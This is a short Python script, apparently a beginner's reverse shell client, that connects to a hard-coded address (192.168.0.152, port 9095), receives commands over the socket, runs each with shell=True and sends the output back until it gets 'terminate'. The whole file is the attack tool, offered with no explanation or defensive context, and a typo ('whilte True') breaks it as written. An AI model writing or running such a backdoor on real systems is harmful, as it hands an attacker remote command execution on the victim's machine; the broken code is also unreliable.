import socket
import subprocess

def connect():
    s = socket.socket()
    s.connect(("192.168.0.152",9095))
    whilte True:
        command = s.recv(1024)
        if "terminate" in command.decode():
            s.close()
            break
        else:
            cmd = subprocess.Popen(command.decode(),shell = True, stdout = subprocess.PIPE, stderr = subprocess.PIPE)
            s.send(cmd.stdout.read())
            s.send(cmd.stderr.read())


def main():
    connect()
main()
